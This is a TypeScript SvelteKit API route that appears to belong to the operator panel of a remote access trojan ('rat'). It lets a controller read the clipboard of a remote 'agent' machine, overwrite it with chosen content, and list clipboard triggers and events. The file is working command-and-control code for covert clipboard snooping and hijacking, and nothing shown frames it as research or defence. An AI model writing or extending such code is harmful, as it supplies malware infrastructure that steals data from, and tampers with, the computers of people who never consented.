import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { clipboardManager, ClipboardError } from '$lib/server/rat/clipboard';
import { registry, RegistryError } from '$lib/server/rat/store';
import type {
	ClipboardCommandPayload,
	ClipboardContent,
	ClipboardSnapshot,
	ClipboardTrigger,
	ClipboardTriggerEvent
} from '$lib/types/clipboard';

interface ClipboardStateResponse {
	state?: ClipboardSnapshot;
	triggers: ClipboardTrigger[];
	events: ClipboardTriggerEvent[];
}

type ClipboardActionRequest =
	| {
			action: 'refresh';
			waitMs?: number;
	  }
	| {
			action: 'set';
			waitMs?: number;
			content: ClipboardContent;
			source?: string;
	  };

function assertClipboardContent(
	input: ClipboardContent | undefined
): asserts input is ClipboardContent {
	if (!input || typeof input !== 'object' || typeof input.format !== 'string') {
		throw error(400, 'Clipboard content must include a format');
	}
}

export const GET: RequestHandler = ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const state = clipboardManager.getState(id);
	const triggers = clipboardManager.listTriggers(id);
	const events = clipboardManager.listEvents(id);

	return json({ state, triggers, events } satisfies ClipboardStateResponse);
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: ClipboardActionRequest;
	try {
		payload = (await request.json()) as ClipboardActionRequest;
	} catch (err) {
		throw error(400, 'Invalid clipboard action payload');
	}

	if (!payload || typeof payload !== 'object' || !('action' in payload)) {
		throw error(400, 'Clipboard action is required');
	}

	const waitMs = 'waitMs' in payload ? payload.waitMs : undefined;

	switch (payload.action) {
		case 'refresh': {
			const { requestId, wait } = clipboardManager.createRequest(id, waitMs);
			try {
				const command: ClipboardCommandPayload = { action: 'get', requestId };
				registry.queueCommand(id, { name: 'clipboard', payload: command });
			} catch (err) {
				if (err instanceof RegistryError) {
					clipboardManager.failPending(id, requestId, new ClipboardError(err.message, err.status));
					throw error(err.status, err.message);
				}
				clipboardManager.failPending(
					id,
					requestId,
					new ClipboardError('Failed to queue clipboard request', 500)
				);
				throw error(500, 'Failed to queue clipboard request');
			}

			try {
				const state = await wait;
				return json({ state } satisfies Pick<ClipboardStateResponse, 'state'>);
			} catch (err) {
				if (err instanceof ClipboardError) {
					throw error(err.status, err.message);
				}
				throw error(500, 'Failed to retrieve clipboard snapshot');
			}
		}
		case 'set': {
			assertClipboardContent(payload.content);
			const { requestId, wait } = clipboardManager.createRequest(id, waitMs);
			try {
				const command: ClipboardCommandPayload = {
					action: 'set',
					requestId,
					content: payload.content,
					source: payload.source ?? 'controller'
				};
				registry.queueCommand(id, { name: 'clipboard', payload: command });
			} catch (err) {
				if (err instanceof RegistryError) {
					clipboardManager.failPending(id, requestId, new ClipboardError(err.message, err.status));
					throw error(err.status, err.message);
				}
				clipboardManager.failPending(
					id,
					requestId,
					new ClipboardError('Failed to queue clipboard update', 500)
				);
				throw error(500, 'Failed to queue clipboard update');
			}

			try {
				const state = await wait;
				return json({ state } satisfies Pick<ClipboardStateResponse, 'state'>);
			} catch (err) {
				if (err instanceof ClipboardError) {
					throw error(err.status, err.message);
				}
				throw error(500, 'Failed to update clipboard');
			}
		}
		default:
			throw error(400, 'Unsupported clipboard action');
	}
};
